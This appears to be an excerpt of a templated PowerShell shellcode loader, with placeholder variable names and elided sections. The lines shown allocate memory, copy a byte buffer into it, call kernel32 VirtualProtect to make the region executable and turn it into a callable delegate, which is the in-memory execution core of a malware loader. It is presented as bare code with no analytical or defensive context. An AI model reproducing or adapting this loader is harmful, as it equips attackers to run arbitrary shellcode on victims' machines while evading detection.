...
If ([IntPtr]::size -eq 8) {
	...
	$%%VAR34%% = $%%VAR33%%.Invoke([IntPtr]::Zero, $%%VAR13%%.Length, 0x3000, 0x04)
	[System.Runtime.InteropServices.Marshal]::Copy($%%VAR13%%, 0, $%%VAR34%%, $%%VAR13%%.length)
    $%%VAR36%% = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((%%VAR3%% kernel32.dll VirtualProtect), (%%VAR1%% @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
	$%%VAR35%% = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($%%VAR34%%, (%%VAR1%% @([IntPtr]) ([Void])))
    $%%VAR36%%.Invoke($%%VAR34%%, [UInt32]0x1000, [UInt32]0x10, [Ref]0x00)
